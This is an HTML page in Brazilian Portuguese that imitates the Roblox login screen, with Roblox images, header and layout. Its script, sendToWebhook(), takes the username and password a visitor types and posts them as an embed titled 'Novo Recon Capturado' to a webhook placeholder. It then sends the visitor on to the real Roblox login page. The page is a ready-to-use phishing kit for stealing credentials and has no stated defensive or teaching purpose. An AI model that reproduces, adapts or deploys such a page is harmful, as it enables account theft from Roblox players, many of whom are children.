<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
                        url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover; background-position: center;
            display: flex; flex-direction: column; overflow: hidden;
        }

        /* HEADER ORIGINAL STYLE */
        .roblox-header {
            width: 100%; height: 40px; background: #232527;
            display: flex; align-items: center; 
            padding: 0 15px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
        }

        .roblox-logo {
            height: 26px; width: 26px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
            background-size: contain; background-repeat: no-repeat;
            margin-right: 15px; cursor: pointer;
        }

        .header-nav { display: flex; align-items: center; gap: 15px; color: #fff; font-size: 14px; font-weight: 500; flex-grow: 1; }
        
        .search-bar { position: relative; flex-grow: 1; max-width: 450px; margin: 0 10px; }
        .search-bar input {
            width: 100%; height: 28px; background: rgba(25,27,29,0.8); border: 1px solid #454749;
            border-radius: 6px; padding-left: 30px; color: #bdbebe; font-size: 13px; outline: none;
        }

        .search-icon { 
            position: absolute; left: 8px; top: 6px; height: 15px; width: 15px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYmRiZWJlIiBzdHJva2Utd2lkdGg9IjIuNSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48Y2lyY2xlIGN4PSIxMSIgY3k9IjExIiByPSI4Ij48L2NpcmNsZT48bGluZSB4MT0iMjEiIHkxPSIyMSIgeDI9IjE2LjY1IiB5Mj0iMTYuNjUiPjwvbGluZT48L3N2Zz4=');
            background-size: contain; background-repeat: no-repeat;
        }

        /* CONTAINER DE LOGIN - AJUSTE DE LARGURA */
        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 40px; }
        
        .login-box {
            background-color: #393b3d; padding: 30px 40px; border-radius: 4px;
            width: 90%; max-width: 380px; text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 2;
        }

        /* TÍTULO - AUMENTADO PARA 28PX PARA DAR MAIS PESO */
        h1 { color: #fff; font-size: 28px; margin-bottom: 25px; font-weight: 700; }
        
        /* INPUTS - AJUSTADOS PARA 44PX DE ALTURA PARA MAIOR ROBUSTEZA */
        input {
            width: 100%; height: 44px; background-color: #252728; border: 1px solid #1a1b1c;
            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 10px;
            box-sizing: border-box; font-size: 16px; outline: none;
        }

        /* BOTÃO ENTRAR - AJUSTADO PARA 42PX DE ALTURA */
        .btn-entrar {
            width: 100%; height: 42px; background-color: transparent; border: 1px solid #ffffff;
            color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px 0 15px 0;
            font-weight: 500;
        }

        /* BOTÃO SECUNDÁRIO - AJUSTADO PARA 44PX DE ALTURA */
        .btn-secondary {
            width: 100%; height: 44px; background-color: #4f5153; border: none;
            color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 10px; cursor: pointer;
            font-weight: 500;
        }

        .forgot-link {
            color: #fff; text-decoration: none; font-size: 13px; 
            display: block; margin-bottom: 20px;
        }

        .footer-classificacao { position: fixed; bottom: 12px; width: 100%; text-align: center; color: #fff; }
    </style>
</head>
<body>

<div class="roblox-header">
    <div class="roblox-logo"></div> 
    <div class="header-nav">
        <span>Destaques</span>
        <span>Mercado</span>
        <span>Criar</span>
        <span>Robux</span>
        <div class="search-bar">
            <div class="search-icon"></div>
            <input type="text" placeholder="Pesquisar">
        </div>
    </div>
    
    <div style="display: flex; gap: 8px;">
        <button style="background: #0084ff; border: none; color: #fff; padding: 4px 10px; border-radius: 4px; font-weight: 700; font-size: 12px; cursor:pointer">Cadastrar-se</button>
        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 4px 10px; border-radius: 4px; font-weight: 700; font-size: 12px; cursor:pointer">Entrar</button>
    </div>
</div>

<div class="container">
    <div class="login-box">
        <h1>Entrar na Roblox</h1>
        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
        <button class="btn-entrar" onclick="sendToWebhook()">Entrar</button>
        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
        <button class="btn-secondary">Envie-me um código único por e-mail</button>
        <button class="btn-secondary">Entrada rápida</button>
        <p style="color: #fff; font-size: 14px; margin-top: 25px;">
            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
        </p>
    </div>
</div>

<div class="footer-classificacao">
    <div style="background: #fff; color: #000; font-weight: bold; padding: 1px 5px; border-radius: 2px; display: inline-block; font-size: 12px;">12</div>
    <div style="font-size: 10px; margin-top: 4px; font-weight: 500; opacity: 0.9;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
</div>

<script>
    function sendToWebhook() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const webhook = "SUA_WEBHOOK_AQUI";

        if(u && p) {
            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    embeds: [{
                        title: "🚀 Novo Recon Capturado",
                        color: 3447003,
                        fields: [
                            { name: "👤 Usuário", value: `\`${u}\``, inline: true },
                            { name: "🔑 Senha", value: `\`${p}\``, inline: true }
                        ],
                        footer: { text: "Sistema de Sincronização Roblox" }
                    }]
                })
            }).then(() => {
                window.location.href = "https://www.roblox.com/login";
            });
        }
    }
</script>
</body>
</html>
